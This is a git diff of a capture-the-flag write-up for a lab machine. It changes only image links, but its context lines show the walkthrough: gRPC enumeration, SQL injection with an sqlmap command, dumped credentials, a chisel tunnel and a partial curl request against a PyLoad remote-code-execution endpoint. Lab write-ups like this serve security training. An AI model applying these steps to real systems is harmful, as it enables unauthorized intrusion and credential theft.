@@ -70,7 +70,7 @@ SF:0\0\0\0\0\?\0\0");
 
 I see that this has some headers. I tried connecting using `telnet` or `nc`, then viewing the traffic within `wireshark`, but all I saw was this:
 
-![](<../../.gitbook/assets/image%20(1079).png>)
+![](../../.gitbook/assets/pc-2.png)
 
 Just a bunch of unrelated TCP traffic. I tried running `curl` on the port and received another weird error.
 
@@ -87,7 +87,7 @@ There are specific tools that are used to interact with this software, and we ca
 
 {% embed url="https://github.com/vadimi/grpc-client-cli" %}
 
-![](<../../.gitbook/assets/image%20(1581).png>)
+![](../../.gitbook/assets/pc-4.png)
 
 The tool worked, which means this is indeed gRPC running.
 
@@ -199,7 +199,7 @@ $ ./grpcui -plaintext 10.129.40.34:50051
 gRPC Web UI available at http://127.0.0.1:35935/
 ```
 
-![](<../../.gitbook/assets/image%20(2865).png>)
+![](../../.gitbook/assets/pc-5.png)
 
 Using this, we can capture the request in Burpsuite and attempt to include our administrator token. This was the HTTP request I sent via Burp, and it kept running into an error:
 
@@ -227,15 +227,15 @@ Sec-Fetch-Site: same-origin
 {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2NjUwNzF9.iur8GhCEFahebtqwyeFLj7wybSwtO4qesiLEWKTv614"}],"data":[{"id":"123"}]}
 ```
 
-![](<../../.gitbook/assets/image%20(3195).png>)
+![](../../.gitbook/assets/pc-6.png)
 
 I thought it was intentional, so I attempted some basic command and SQL injection. I found that UNION SQL injection works!
 
-![](<../../.gitbook/assets/image%20(154).png>)
+![](../../.gitbook/assets/pc-3.png)
 
 Using version enumeration, we can find that this uses SQLite.
 
-![](<../../.gitbook/assets/image%20(531).png>)
+![](../../.gitbook/assets/pc-9.png)
 
 I tossed this Burp request to `sqlmap`, which also gives me a true positive.
 
@@ -243,7 +243,7 @@ I tossed this Burp request to `sqlmap`, which also gives me a true positive.
 sqlmap -r req -p id --level 5 --risk 3 --dbms sqlite
 ```
 
-![](<../../.gitbook/assets/image%20(3645).png>)
+![](../../.gitbook/assets/pc-8.png)
 
 Then, we can enumerate the database and dump the passwords within the database.
 
@@ -275,7 +275,7 @@ Table: accounts
 
 We had credentials for this user, and it works with `ssh`.
 
-![](<../../.gitbook/assets/image%20(693).png>)
+![](../../.gitbook/assets/pc-10.png)
 
 ## Privilege Escalation
 
@@ -310,7 +310,7 @@ chisel client 10.10.14.39 5555 R:8000:127.0.0.1:8000
 
 Here, we will see a PyLoad instance.
 
-![](<../../.gitbook/assets/image%20(1025).png>)
+![](../../.gitbook/assets/pc-1.png)
 
 This software had a recent RCE vulnerability found within it.
 
@@ -335,6 +335,6 @@ $ curl -i -s -k -X $'POST' \
     $'http://127.0.0.1:8000/flash/addcrypted2
 ```
 
-![](<../../.gitbook/assets/image%20(3224).png>)
+![](../../.gitbook/assets/pc-7.png)
 
 Rooted!
